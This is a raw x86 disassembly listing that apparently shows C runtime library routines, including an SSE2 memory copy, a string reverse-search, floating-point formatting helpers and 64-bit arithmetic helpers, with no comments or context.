  427941:	cmp    ecx,0x8
  427944:	jb     0x4278a0
  42794a:	std    
  42794b:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42794d:	cld    
  42794e:	jmp    DWORD PTR [edx*4+0x4279c4]
  427955:	lea    ecx,[ecx+0x0]
  427958:	js     0x4279d3
  42795a:	inc    edx
  42795b:	add    BYTE PTR [eax-0x77ffbd87],al
  427961:	jns    0x4279a5
  427963:	add    BYTE PTR [eax-0x67ffbd87],dl
  427969:	jns    0x4279ad
  42796b:	add    BYTE PTR [eax-0x57ffbd87],ah
  427971:	jns    0x4279b5
  427973:	add    BYTE PTR [ebx-0x74ffbd87],bh
  427979:	inc    esp
  42797a:	mov    ds,WORD PTR [ecx+ecx*4]
  42797d:	inc    esp
  42797e:	(bad)  
  42797f:	sbb    al,0x8b
  427981:	inc    esp
  427982:	mov    ds,WORD PTR [eax]
  427984:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  427988:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  42798c:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  427990:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  427994:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  427998:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  42799c:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4279a0:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4279a4:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4279a8:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4279ac:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4279b0:	lea    eax,[ecx*4+0x0]
  4279b7:	add    esi,eax
  4279b9:	add    edi,eax
  4279bb:	jmp    DWORD PTR [edx*4+0x4279c4]
  4279c2:	mov    edi,edi
  4279c4:	aam    0x79
  4279c6:	inc    edx
  4279c7:	add    ah,bl
  4279c9:	jns    0x427a0d
  4279cb:	add    ah,ch
  4279cd:	jns    0x427a11
  4279cf:	add    BYTE PTR [eax],al
  4279d1:	jp     0x427a15
  4279d3:	add    BYTE PTR [ebx+0x5e0c2444],cl
  4279d9:	pop    edi
  4279da:	ret    
  4279db:	nop
  4279dc:	mov    al,BYTE PTR [esi+0x3]
  4279df:	mov    BYTE PTR [edi+0x3],al
  4279e2:	mov    eax,DWORD PTR [esp+0xc]
  4279e6:	pop    esi
  4279e7:	pop    edi
  4279e8:	ret    
  4279e9:	lea    ecx,[ecx+0x0]
  4279ec:	mov    al,BYTE PTR [esi+0x3]
  4279ef:	mov    BYTE PTR [edi+0x3],al
  4279f2:	mov    al,BYTE PTR [esi+0x2]
  4279f5:	mov    BYTE PTR [edi+0x2],al
  4279f8:	mov    eax,DWORD PTR [esp+0xc]
  4279fc:	pop    esi
  4279fd:	pop    edi
  4279fe:	ret    
  4279ff:	nop
  427a00:	mov    al,BYTE PTR [esi+0x3]
  427a03:	mov    BYTE PTR [edi+0x3],al
  427a06:	mov    al,BYTE PTR [esi+0x2]
  427a09:	mov    BYTE PTR [edi+0x2],al
  427a0c:	mov    al,BYTE PTR [esi+0x1]
  427a0f:	mov    BYTE PTR [edi+0x1],al
  427a12:	mov    eax,DWORD PTR [esp+0xc]
  427a16:	pop    esi
  427a17:	pop    edi
  427a18:	ret    
  427a19:	lea    esp,[esp+0x0]
  427a20:	push   edi
  427a21:	mov    eax,esi
  427a23:	and    eax,0xf
  427a26:	test   eax,eax
  427a28:	jne    0x427b00
  427a2e:	mov    edx,ecx
  427a30:	and    ecx,0x7f
  427a33:	shr    edx,0x7
  427a36:	je     0x427a9d
  427a38:	lea    esp,[esp+0x0]
  427a3f:	nop
  427a40:	movdqa xmm0,XMMWORD PTR [esi]
  427a44:	movdqa xmm1,XMMWORD PTR [esi+0x10]
  427a49:	movdqa xmm2,XMMWORD PTR [esi+0x20]
  427a4e:	movdqa xmm3,XMMWORD PTR [esi+0x30]
  427a53:	movdqa XMMWORD PTR [edi],xmm0
  427a57:	movdqa XMMWORD PTR [edi+0x10],xmm1
  427a5c:	movdqa XMMWORD PTR [edi+0x20],xmm2
  427a61:	movdqa XMMWORD PTR [edi+0x30],xmm3
  427a66:	movdqa xmm4,XMMWORD PTR [esi+0x40]
  427a6b:	movdqa xmm5,XMMWORD PTR [esi+0x50]
  427a70:	movdqa xmm6,XMMWORD PTR [esi+0x60]
  427a75:	movdqa xmm7,XMMWORD PTR [esi+0x70]
  427a7a:	movdqa XMMWORD PTR [edi+0x40],xmm4
  427a7f:	movdqa XMMWORD PTR [edi+0x50],xmm5
  427a84:	movdqa XMMWORD PTR [edi+0x60],xmm6
  427a89:	movdqa XMMWORD PTR [edi+0x70],xmm7
  427a8e:	lea    esi,[esi+0x80]
  427a94:	lea    edi,[edi+0x80]
  427a9a:	dec    edx
  427a9b:	jne    0x427a40
  427a9d:	test   ecx,ecx
  427a9f:	je     0x427af0
  427aa1:	mov    edx,ecx
  427aa3:	shr    edx,0x4
  427aa6:	test   edx,edx
  427aa8:	je     0x427ac1
  427aaa:	lea    ebx,[ebx+0x0]
  427ab0:	movdqa xmm0,XMMWORD PTR [esi]
  427ab4:	movdqa XMMWORD PTR [edi],xmm0
  427ab8:	lea    esi,[esi+0x10]
  427abb:	lea    edi,[edi+0x10]
  427abe:	dec    edx
  427abf:	jne    0x427ab0
  427ac1:	and    ecx,0xf
  427ac4:	je     0x427af0
  427ac6:	mov    eax,ecx
  427ac8:	shr    ecx,0x2
  427acb:	je     0x427ada
  427acd:	mov    edx,DWORD PTR [esi]
  427acf:	mov    DWORD PTR [edi],edx
  427ad1:	lea    esi,[esi+0x4]
  427ad4:	lea    edi,[edi+0x4]
  427ad7:	dec    ecx
  427ad8:	jne    0x427acd
  427ada:	mov    ecx,eax
  427adc:	and    ecx,0x3
  427adf:	je     0x427af0
  427ae1:	mov    al,BYTE PTR [esi]
  427ae3:	mov    BYTE PTR [edi],al
  427ae5:	inc    esi
  427ae6:	inc    edi
  427ae7:	dec    ecx
  427ae8:	jne    0x427ae1
  427aea:	lea    ebx,[ebx+0x0]
  427af0:	pop    eax
  427af1:	pop    esi
  427af2:	pop    edi
  427af3:	ret    
  427af4:	lea    esp,[esp+0x0]
  427afb:	jmp    0x427b00
  427afd:	int3   
  427afe:	int3   
  427aff:	int3   
  427b00:	mov    edx,0x10
  427b05:	sub    edx,eax
  427b07:	sub    ecx,edx
  427b09:	push   ecx
  427b0a:	mov    eax,edx
  427b0c:	mov    ecx,eax
  427b0e:	and    ecx,0x3
  427b11:	je     0x427b1c
  427b13:	mov    dl,BYTE PTR [esi]
  427b15:	mov    BYTE PTR [edi],dl
  427b17:	inc    esi
  427b18:	inc    edi
  427b19:	dec    ecx
  427b1a:	jne    0x427b13
  427b1c:	shr    eax,0x2
  427b1f:	je     0x427b2e
  427b21:	mov    edx,DWORD PTR [esi]
  427b23:	mov    DWORD PTR [edi],edx
  427b25:	lea    esi,[esi+0x4]
  427b28:	lea    edi,[edi+0x4]
  427b2b:	dec    eax
  427b2c:	jne    0x427b21
  427b2e:	pop    ecx
  427b2f:	jmp    0x427a2e
  427b34:	int3   
  427b35:	int3   
  427b36:	int3   
  427b37:	int3   
  427b38:	int3   
  427b39:	int3   
  427b3a:	int3   
  427b3b:	int3   
  427b3c:	int3   
  427b3d:	int3   
  427b3e:	int3   
  427b3f:	int3   
  427b40:	push   ebp
  427b41:	mov    ebp,esp
  427b43:	push   edi
  427b44:	cmp    DWORD PTR ds:0x432b20,0x1
  427b4b:	jb     0x427c4e
  427b51:	mov    edi,DWORD PTR [ebp+0x8]
  427b54:	ja     0x427bcd
  427b56:	movzx  edx,BYTE PTR [ebp+0xc]
  427b5a:	mov    eax,edx
  427b5c:	shl    edx,0x8
  427b5f:	or     edx,eax
  427b61:	movd   xmm3,edx
  427b65:	pshuflw xmm3,xmm3,0x0
  427b6a:	movlhps xmm3,xmm3
  427b6d:	mov    ecx,0xf
  427b72:	and    ecx,edi
  427b74:	or     eax,0xffffffff
  427b77:	shl    eax,cl
  427b79:	sub    edi,ecx
  427b7b:	xor    edx,edx
  427b7d:	movdqu xmm1,XMMWORD PTR [edi]
  427b81:	pxor   xmm2,xmm2
  427b85:	pcmpeqb xmm2,xmm1
  427b89:	pcmpeqb xmm1,xmm3
  427b8d:	pmovmskb ecx,xmm2
  427b91:	and    ecx,eax
  427b93:	jne    0x427bad
  427b95:	pmovmskb ecx,xmm1
  427b99:	and    ecx,eax
  427b9b:	bsr    eax,ecx
  427b9e:	add    eax,edi
  427ba0:	test   ecx,ecx
  427ba2:	cmovne edx,eax
  427ba5:	or     eax,0xffffffff
  427ba8:	add    edi,0x10
  427bab:	jmp    0x427b7d
  427bad:	push   ebx
  427bae:	pmovmskb ebx,xmm1
  427bb2:	and    ebx,eax
  427bb4:	shl    ecx,1
  427bb6:	xor    eax,eax
  427bb8:	sub    eax,ecx
  427bba:	and    ecx,eax
  427bbc:	dec    ecx
  427bbd:	and    ecx,ebx
  427bbf:	pop    ebx
  427bc0:	bsr    eax,ecx
  427bc3:	add    eax,edi
  427bc5:	test   ecx,ecx
  427bc7:	cmove  eax,edx
  427bca:	pop    edi
  427bcb:	leave  
  427bcc:	ret    
  427bcd:	movzx  edx,BYTE PTR [ebp+0xc]
  427bd1:	test   edx,edx
  427bd3:	je     0x427c0e
  427bd5:	xor    eax,eax
  427bd7:	test   edi,0xf
  427bdd:	je     0x427bf4
  427bdf:	movzx  ecx,BYTE PTR [edi]
  427be2:	cmp    ecx,edx
  427be4:	cmove  eax,edi
  427be7:	test   ecx,ecx
  427be9:	je     0x427c0b
  427beb:	inc    edi
  427bec:	test   edi,0xf
  427bf2:	jne    0x427bdf
  427bf4:	movd   xmm0,edx
  427bf8:	add    edi,0x10
  427bfb:	pcmpistri xmm0,XMMWORD PTR [edi-0x10],0x40
  427c02:	lea    ecx,[edi+ecx*1-0x10]
  427c06:	cmovb  eax,ecx
  427c09:	jne    0x427bf8
  427c0b:	pop    edi
  427c0c:	leave  
  427c0d:	ret    
  427c0e:	mov    eax,0xfffffff0
  427c13:	and    eax,edi
  427c15:	pxor   xmm0,xmm0
  427c19:	pcmpeqb xmm0,XMMWORD PTR [eax]
  427c1d:	mov    ecx,0xf
  427c22:	and    ecx,edi
  427c24:	mov    edx,0xffffffff
  427c29:	shl    edx,cl
  427c2b:	pmovmskb edi,xmm0
  427c2f:	and    edi,edx
  427c31:	jne    0x427c47
  427c33:	pxor   xmm0,xmm0
  427c37:	pcmpeqb xmm0,XMMWORD PTR [eax+0x10]
  427c3c:	add    eax,0x10
  427c3f:	pmovmskb edi,xmm0
  427c43:	test   edi,edi
  427c45:	je     0x427c33
  427c47:	bsf    edx,edi
  427c4a:	add    eax,edx
  427c4c:	jmp    0x427c0b
  427c4e:	mov    edi,DWORD PTR [ebp+0x8]
  427c51:	xor    eax,eax
  427c53:	or     ecx,0xffffffff
  427c56:	repnz scas al,BYTE PTR es:[edi]
  427c58:	add    ecx,0x1
  427c5b:	neg    ecx
  427c5d:	sub    edi,0x1
  427c60:	mov    al,BYTE PTR [ebp+0xc]
  427c63:	std    
  427c64:	repnz scas al,BYTE PTR es:[edi]
  427c66:	add    edi,0x1
  427c69:	cmp    BYTE PTR [edi],al
  427c6b:	je     0x427c71
  427c6d:	xor    eax,eax
  427c6f:	jmp    0x427c73
  427c71:	mov    eax,edi
  427c73:	cld    
  427c74:	pop    edi
  427c75:	leave  
  427c76:	ret    
  427c77:	push   ebp
  427c78:	mov    ebp,esp
  427c7a:	mov    edx,DWORD PTR [ebp+0x14]
  427c7d:	push   esi
  427c7e:	mov    esi,DWORD PTR [ebp+0x8]
  427c81:	push   edi
  427c82:	mov    edi,DWORD PTR [edx+0xc]
  427c85:	test   esi,esi
  427c87:	jne    0x427c9f
  427c89:	call   0x41fb32
  427c8e:	push   0x16
  427c90:	pop    esi
  427c91:	mov    DWORD PTR [eax],esi
  427c93:	call   0x422622
  427c98:	mov    eax,esi
  427c9a:	jmp    0x427d23
  427c9f:	cmp    DWORD PTR [ebp+0xc],0x0
  427ca3:	jbe    0x427c89
  427ca5:	mov    ecx,DWORD PTR [ebp+0x10]
  427ca8:	mov    BYTE PTR [esi],0x0
  427cab:	test   ecx,ecx
  427cad:	jle    0x427cb3
  427caf:	mov    eax,ecx
  427cb1:	jmp    0x427cb5
  427cb3:	xor    eax,eax
  427cb5:	inc    eax
  427cb6:	cmp    DWORD PTR [ebp+0xc],eax
  427cb9:	ja     0x427cc4
  427cbb:	call   0x41fb32
  427cc0:	push   0x22
  427cc2:	jmp    0x427c90
  427cc4:	mov    BYTE PTR [esi],0x30
  427cc7:	push   ebx
  427cc8:	lea    ebx,[esi+0x1]
  427ccb:	mov    eax,ebx
  427ccd:	test   ecx,ecx
  427ccf:	jle    0x427ceb
  427cd1:	mov    dl,BYTE PTR [edi]
  427cd3:	test   dl,dl
  427cd5:	je     0x427cdd
  427cd7:	movsx  edx,dl
  427cda:	inc    edi
  427cdb:	jmp    0x427ce0
  427cdd:	push   0x30
  427cdf:	pop    edx
  427ce0:	mov    BYTE PTR [eax],dl
  427ce2:	inc    eax
  427ce3:	dec    ecx
  427ce4:	test   ecx,ecx
  427ce6:	jg     0x427cd1
  427ce8:	mov    edx,DWORD PTR [ebp+0x14]
  427ceb:	mov    BYTE PTR [eax],0x0
  427cee:	test   ecx,ecx
  427cf0:	js     0x427d04
  427cf2:	cmp    BYTE PTR [edi],0x35
  427cf5:	jl     0x427d04
  427cf7:	jmp    0x427cfc
  427cf9:	mov    BYTE PTR [eax],0x30
  427cfc:	dec    eax
  427cfd:	cmp    BYTE PTR [eax],0x39
  427d00:	je     0x427cf9
  427d02:	inc    BYTE PTR [eax]
  427d04:	cmp    BYTE PTR [esi],0x31
  427d07:	jne    0x427d0e
  427d09:	inc    DWORD PTR [edx+0x4]
  427d0c:	jmp    0x427d20
  427d0e:	push   ebx
  427d0f:	call   0x422a80
  427d14:	inc    eax
  427d15:	push   eax
  427d16:	push   ebx
  427d17:	push   esi
  427d18:	call   0x4274f0
  427d1d:	add    esp,0x10
  427d20:	xor    eax,eax
  427d22:	pop    ebx
  427d23:	pop    edi
  427d24:	pop    esi
  427d25:	pop    ebp
  427d26:	ret    
  427d27:	push   ebp
  427d28:	mov    ebp,esp
  427d2a:	push   ecx
  427d2b:	push   ecx
  427d2c:	mov    eax,DWORD PTR [ebp+0xc]
  427d2f:	push   ebx
  427d30:	push   esi
  427d31:	push   edi
  427d32:	movzx  edi,WORD PTR [eax+0x6]
  427d36:	mov    ebx,0x80000000
  427d3b:	mov    edx,DWORD PTR [eax+0x4]
  427d3e:	mov    ecx,edi
  427d40:	mov    eax,DWORD PTR [eax]
  427d42:	and    edi,0x8000
  427d48:	shr    ecx,0x4
  427d4b:	and    edx,0xfffff
  427d51:	and    ecx,0x7ff
  427d57:	mov    DWORD PTR [ebp-0x8],edi
  427d5a:	mov    esi,ecx
  427d5c:	mov    DWORD PTR [ebp-0x4],eax
  427d5f:	test   esi,esi
  427d61:	je     0x427d7a
  427d63:	cmp    esi,0x7ff
  427d69:	je     0x427d73
  427d6b:	lea    eax,[ecx+0x3c00]
  427d71:	jmp    0x427d98
  427d73:	mov    eax,0x7fff
  427d78:	jmp    0x427d9b
  427d7a:	test   edx,edx
  427d7c:	jne    0x427d90
  427d7e:	test   eax,eax
  427d80:	jne    0x427d90
  427d82:	mov    eax,DWORD PTR [ebp+0x8]
  427d85:	and    DWORD PTR [eax+0x4],edx
  427d88:	and    DWORD PTR [eax],edx
  427d8a:	mov    WORD PTR [eax+0x8],di
  427d8e:	jmp    0x427de8
  427d90:	lea    eax,[ecx+0x3c01]
  427d96:	xor    ebx,ebx
  427d98:	movzx  eax,ax
  427d9b:	mov    ecx,DWORD PTR [ebp-0x4]
  427d9e:	mov    esi,ecx
  427da0:	shr    esi,0x15
  427da3:	shl    edx,0xb
  427da6:	or     esi,edx
  427da8:	shl    ecx,0xb
  427dab:	or     esi,ebx
  427dad:	mov    DWORD PTR [ebp+0xc],eax
  427db0:	mov    ebx,DWORD PTR [ebp+0x8]
  427db3:	mov    DWORD PTR [ebx+0x4],esi
  427db6:	mov    DWORD PTR [ebx],ecx
  427db8:	test   esi,esi
  427dba:	js     0x427de2
  427dbc:	mov    edi,eax
  427dbe:	mov    edx,DWORD PTR [ebx]
  427dc0:	add    esi,esi
  427dc2:	mov    ecx,edx
  427dc4:	add    edi,0xffff
  427dca:	shr    ecx,0x1f
  427dcd:	or     esi,ecx
  427dcf:	lea    eax,[edx+edx*1]
  427dd2:	mov    DWORD PTR [ebx],eax
  427dd4:	jns    0x427dbe
  427dd6:	mov    DWORD PTR [ebp+0xc],edi
  427dd9:	mov    edi,DWORD PTR [ebp-0x8]
  427ddc:	mov    eax,DWORD PTR [ebp+0xc]
  427ddf:	mov    DWORD PTR [ebx+0x4],esi
  427de2:	or     edi,eax
  427de4:	mov    WORD PTR [ebx+0x8],di
  427de8:	pop    edi
  427de9:	pop    esi
  427dea:	pop    ebx
  427deb:	mov    esp,ebp
  427ded:	pop    ebp
  427dee:	ret    
  427def:	push   ebp
  427df0:	mov    ebp,esp
  427df2:	sub    esp,0x30
  427df5:	mov    eax,ds:0x4314e0
  427dfa:	xor    eax,ebp
  427dfc:	mov    DWORD PTR [ebp-0x4],eax
  427dff:	mov    eax,DWORD PTR [ebp+0x14]
  427e02:	push   ebx
  427e03:	mov    ebx,DWORD PTR [ebp+0x10]
  427e06:	push   esi
  427e07:	mov    DWORD PTR [ebp-0x24],eax
  427e0a:	lea    eax,[ebp+0x8]
  427e0d:	push   edi
  427e0e:	push   eax
  427e0f:	lea    eax,[ebp-0x30]
  427e12:	push   eax
  427e13:	call   0x427d27
  427e18:	pop    ecx
  427e19:	pop    ecx
  427e1a:	lea    eax,[ebp-0x20]
  427e1d:	push   eax
  427e1e:	push   0x0
  427e20:	push   0x11
  427e22:	sub    esp,0xc
  427e25:	lea    esi,[ebp-0x30]
  427e28:	mov    edi,esp
  427e2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e2c:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  427e2e:	call   0x427fdc
  427e33:	mov    esi,DWORD PTR [ebp-0x24]
  427e36:	mov    DWORD PTR [ebx+0x8],eax
  427e39:	movsx  eax,BYTE PTR [ebp-0x1e]
  427e3d:	mov    DWORD PTR [ebx],eax
  427e3f:	movsx  eax,WORD PTR [ebp-0x20]
  427e43:	mov    DWORD PTR [ebx+0x4],eax
  427e46:	lea    eax,[ebp-0x1c]
  427e49:	push   eax
  427e4a:	push   DWORD PTR [ebp+0x18]
  427e4d:	push   esi
  427e4e:	call   0x41f159
  427e53:	add    esp,0x24
  427e56:	test   eax,eax
  427e58:	jne    0x427e70
  427e5a:	mov    ecx,DWORD PTR [ebp-0x4]
  427e5d:	mov    eax,ebx
  427e5f:	pop    edi
  427e60:	mov    DWORD PTR [ebx+0xc],esi
  427e63:	xor    ecx,ebp
  427e65:	pop    esi
  427e66:	pop    ebx
  427e67:	call   0x421878
  427e6c:	mov    esp,ebp
  427e6e:	pop    ebp
  427e6f:	ret    
  427e70:	xor    eax,eax
  427e72:	push   eax
  427e73:	push   eax
  427e74:	push   eax
  427e75:	push   eax
  427e76:	push   eax
  427e77:	call   0x41fb45
  427e7c:	int3   
  427e7d:	int3   
  427e7e:	int3   
  427e7f:	int3   
  427e80:	push   edi
  427e81:	push   esi
  427e82:	push   ebp
  427e83:	xor    edi,edi
  427e85:	xor    ebp,ebp
  427e87:	mov    eax,DWORD PTR [esp+0x14]
  427e8b:	or     eax,eax
  427e8d:	jge    0x427ea4
  427e8f:	inc    edi
  427e90:	inc    ebp
  427e91:	mov    edx,DWORD PTR [esp+0x10]
  427e95:	neg    eax
  427e97:	neg    edx
  427e99:	sbb    eax,0x0
  427e9c:	mov    DWORD PTR [esp+0x14],eax
  427ea0:	mov    DWORD PTR [esp+0x10],edx
  427ea4:	mov    eax,DWORD PTR [esp+0x1c]
  427ea8:	or     eax,eax
  427eaa:	jge    0x427ec0
  427eac:	inc    edi
  427ead:	mov    edx,DWORD PTR [esp+0x18]
  427eb1:	neg    eax
  427eb3:	neg    edx
  427eb5:	sbb    eax,0x0
  427eb8:	mov    DWORD PTR [esp+0x1c],eax
  427ebc:	mov    DWORD PTR [esp+0x18],edx
  427ec0:	or     eax,eax
  427ec2:	jne    0x427eec
  427ec4:	mov    ecx,DWORD PTR [esp+0x18]
  427ec8:	mov    eax,DWORD PTR [esp+0x14]
  427ecc:	xor    edx,edx
  427ece:	div    ecx
  427ed0:	mov    ebx,eax
  427ed2:	mov    eax,DWORD PTR [esp+0x10]
  427ed6:	div    ecx
  427ed8:	mov    esi,eax
  427eda:	mov    eax,ebx
  427edc:	mul    DWORD PTR [esp+0x18]
  427ee0:	mov    ecx,eax
  427ee2:	mov    eax,esi
  427ee4:	mul    DWORD PTR [esp+0x18]
  427ee8:	add    edx,ecx
  427eea:	jmp    0x427f33
  427eec:	mov    ebx,eax
  427eee:	mov    ecx,DWORD PTR [esp+0x18]
  427ef2:	mov    edx,DWORD PTR [esp+0x14]
  427ef6:	mov    eax,DWORD PTR [esp+0x10]
  427efa:	shr    ebx,1
  427efc:	rcr    ecx,1
  427efe:	shr    edx,1
  427f00:	rcr    eax,1
  427f02:	or     ebx,ebx
  427f04:	jne    0x427efa
  427f06:	div    ecx
  427f08:	mov    esi,eax
  427f0a:	mul    DWORD PTR [esp+0x1c]
  427f0e:	mov    ecx,eax
  427f10:	mov    eax,DWORD PTR [esp+0x18]
  427f14:	mul    esi
  427f16:	add    edx,ecx
  427f18:	jb     0x427f28
  427f1a:	cmp    edx,DWORD PTR [esp+0x14]
  427f1e:	ja     0x427f28
  427f20:	jb     0x427f31
  427f22:	cmp    eax,DWORD PTR [esp+0x10]
  427f26:	jbe    0x427f31
  427f28:	dec    esi
  427f29:	sub    eax,DWORD PTR [esp+0x18]
  427f2d:	sbb    edx,DWORD PTR [esp+0x1c]
  427f31:	xor    ebx,ebx
  427f33:	sub    eax,DWORD PTR [esp+0x10]
  427f37:	sbb    edx,DWORD PTR [esp+0x14]
  427f3b:	dec    ebp
  427f3c:	jns    0x427f45
  427f3e:	neg    edx
  427f40:	neg    eax
  427f42:	sbb    edx,0x0
  427f45:	mov    ecx,edx
  427f47:	mov    edx,ebx
  427f49:	mov    ebx,ecx
  427f4b:	mov    ecx,eax
  427f4d:	mov    eax,esi
  427f4f:	dec    edi
  427f50:	jne    0x427f59
  427f52:	neg    edx
  427f54:	neg    eax
  427f56:	sbb    edx,0x0
  427f59:	pop    ebp
  427f5a:	pop    esi
  427f5b:	pop    edi
  427f5c:	ret    0x10
  427f5f:	int3   
  427f60:	cmp    cl,0x40
  427f63:	jae    0x427f7a
  427f65:	cmp    cl,0x20
  427f68:	jae    0x427f70
  427f6a:	shrd   eax,edx,cl
  427f6d:	shr    edx,cl
  427f6f:	ret    
  427f70:	mov    eax,edx
  427f72:	xor    edx,edx
  427f74:	and    cl,0x1f
  427f77:	shr    eax,cl
  427f79:	ret    
  427f7a:	xor    eax,eax
  427f7c:	xor    edx,edx
  427f7e:	ret    
  427f7f:	push   ebp
  427f80:	mov    ebp,esp
  427f82:	mov    ecx,DWORD PTR [ebp+0x10]
  427f85:	mov    eax,DWORD PTR [ebp+0xc]
  427f88:	and    ecx,0xfff7ffff
  427f8e:	and    eax,ecx
  427f90:	push   esi
  427f91:	mov    esi,DWORD PTR [ebp+0x8]
  427f94:	test   eax,0xfcf0fce0
  427f99:	je     0x427fbf
  427f9b:	test   esi,esi
  427f9d:	je     0x427fac
  427f9f:	push   0x0
  427fa1:	push   0x0
  427fa3:	call   0x428a59
  427fa8:	pop    ecx
  427fa9:	pop    ecx
  427faa:	mov    DWORD PTR [esi],eax
  427fac:	call   0x41fb32
  427fb1:	push   0x16
  427fb3:	pop    esi
  427fb4:	mov    DWORD PTR [eax],esi
  427fb6:	call   0x422622
  427fbb:	mov    eax,esi
  427fbd:	jmp    0x427fd9
  427fbf:	push   ecx
  427fc0:	push   DWORD PTR [ebp+0xc]
  427fc3:	test   esi,esi
  427fc5:	je     0x427fd0
  427fc7:	call   0x428a59
  427fcc:	mov    DWORD PTR [esi],eax
  427fce:	jmp    0x427fd5
  427fd0:	call   0x428a59
  427fd5:	pop    ecx
  427fd6:	pop    ecx
  427fd7:	xor    eax,eax
  427fd9:	pop    esi
  427fda:	pop    ebp
  427fdb:	ret    
  427fdc:	push   ebp
  427fdd:	mov    ebp,esp
  427fdf:	sub    esp,0x88
  427fe5:	mov    eax,ds:0x4314e0
  427fea:	xor    eax,ebp
  427fec:	mov    DWORD PTR [ebp-0x4],eax
  427fef:	movzx  edx,WORD PTR [ebp+0x10]
  427ff3:	xor    ecx,ecx
  427ff5:	push   ebx
  427ff6:	mov    ebx,DWORD PTR [ebp+0x1c]
  427ff9:	mov    eax,0x7fff
  427ffe:	push   esi
  427fff:	mov    esi,0x8000
  428004:	mov    DWORD PTR [ebp-0x74],ebx
  428007:	and    edx,esi
  428009:	mov    DWORD PTR [ebp-0x30],0xcccccccc
  428010:	movzx  esi,WORD PTR [ebp+0x10]
  428014:	inc    ecx
  428015:	and    esi,eax
  428017:	mov    DWORD PTR [ebp-0x2c],0xcccccccc
  42801e:	mov    DWORD PTR [ebp-0x28],0x3ffbcccc
  428025:	mov    DWORD PTR [ebp-0x80],edx
  428028:	mov    DWORD PTR [ebp-0x64],eax
  42802b:	push   edi
  42802c:	test   dx,dx
  42802f:	je     0x428037
  428031:	mov    BYTE PTR [ebx+0x2],0x2d
  428035:	jmp    0x42803b
  428037:	mov    BYTE PTR [ebx+0x2],0x20
  42803b:	mov    edi,DWORD PTR [ebp+0xc]
  42803e:	test   si,si
  428041:	jne    0x42807d
  428043:	test   edi,edi
  428045:	jne    0x428112
  42804b:	cmp    DWORD PTR [ebp+0x8],edi
  42804e:	jne    0x428112
  428054:	xor    eax,eax
  428056:	mov    BYTE PTR [ebx+0x3],cl
  428059:	mov    WORD PTR [ebx],ax
  42805c:	mov    eax,0x8000
  428061:	cmp    dx,ax
  428064:	setne  al
  428067:	dec    al
  428069:	and    al,0xd
  42806b:	add    al,0x20
  42806d:	mov    BYTE PTR [ebx+0x2],al
  428070:	mov    eax,ecx
  428072:	mov    WORD PTR [ebx+0x4],0x30
  428078:	jmp    0x428959
  42807d:	cmp    si,ax
  428080:	jne    0x428112
  428086:	mov    eax,DWORD PTR [ebp+0xc]
  428089:	mov    edx,0x80000000
  42808e:	mov    WORD PTR [ebx],cx
  428091:	mov    ecx,DWORD PTR [ebp+0x8]
  428094:	cmp    eax,edx
  428096:	jne    0x42809c
  428098:	test   ecx,ecx
  42809a:	je     0x4280aa
  42809c:	test   eax,0x40000000
  4280a1:	jne    0x4280aa
  4280a3:	push   0x42d974
  4280a8:	jmp    0x4280f1
  4280aa:	cmp    WORD PTR [ebp-0x80],0x0
  4280af:	je     0x4280c3
  4280b1:	cmp    eax,0xc0000000
  4280b6:	jne    0x4280c3
  4280b8:	test   ecx,ecx
  4280ba:	jne    0x4280ec
  4280bc:	push   0x42d97c
  4280c1:	jmp    0x4280d0
  4280c3:	cmp    eax,edx
  4280c5:	jne    0x4280ec
  4280c7:	test   ecx,ecx
  4280c9:	jne    0x4280ec
  4280cb:	push   0x42d984
  4280d0:	lea    eax,[ebx+0x4]
  4280d3:	push   0x16
  4280d5:	push   eax
  4280d6:	call   0x41f159
  4280db:	add    esp,0xc
  4280de:	test   eax,eax
  4280e0:	jne    0x4289a3
  4280e6:	mov    BYTE PTR [ebx+0x3],0x5
  4280ea:	jmp    0x42810b
  4280ec:	push   0x42d98c
  4280f1:	lea    eax,[ebx+0x4]
  4280f4:	push   0x16
  4280f6:	push   eax
  4280f7:	call   0x41f159
  4280fc:	add    esp,0xc
  4280ff:	test   eax,eax
  428101:	jne    0x4289a3
  428107:	mov    BYTE PTR [ebx+0x3],0x6
  42810b:	xor    eax,eax
  42810d:	jmp    0x428959
  428112:	movzx  edx,si
  428115:	mov    ecx,edi
  428117:	shr    ecx,0x18
  42811a:	mov    eax,edx
  42811c:	shr    eax,0x8
  42811f:	xor    ebx,ebx
  428121:	mov    DWORD PTR [ebp-0x1a],edi
  428124:	mov    edi,0x4315e8
  428129:	sub    edi,0x60
  42812c:	mov    WORD PTR [ebp-0x16],si
  428130:	mov    DWORD PTR [ebp-0x58],0x5
  428137:	lea    eax,[eax+ecx*2]
  42813a:	mov    DWORD PTR [ebp-0x70],0xbffd
  428141:	imul   ecx,eax,0x4d
  428144:	imul   eax,edx,0x4d10
  42814a:	mov    DWORD PTR [ebp-0x54],0x3fbf
  428151:	add    eax,0xecbced0c
  428156:	add    eax,ecx
  428158:	sar    eax,0x10
  42815b:	movzx  ecx,ax
  42815e:	mov    eax,DWORD PTR [ebp+0x8]
  428161:	mov    DWORD PTR [ebp-0x1e],eax
  428164:	xor    eax,eax
  428166:	mov    WORD PTR [ebp-0x20],ax
  42816a:	movsx  eax,cx
  42816d:	neg    eax
  42816f:	mov    DWORD PTR [ebp-0x48],ecx
  428172:	mov    DWORD PTR [ebp-0x44],eax
  428175:	test   eax,eax
  428177:	je     0x4284ac
  42817d:	jns    0x42818e
  42817f:	neg    eax
  428181:	mov    edi,0x431748
  428186:	sub    edi,0x60
  428189:	mov    DWORD PTR [ebp-0x44],eax
  42818c:	test   eax,eax
  42818e:	je     0x4284ac
  428194:	mov    esi,DWORD PTR [ebp-0x20]
  428197:	mov    edx,DWORD PTR [ebp-0x1c]
  42819a:	mov    DWORD PTR [ebp-0x40],esi
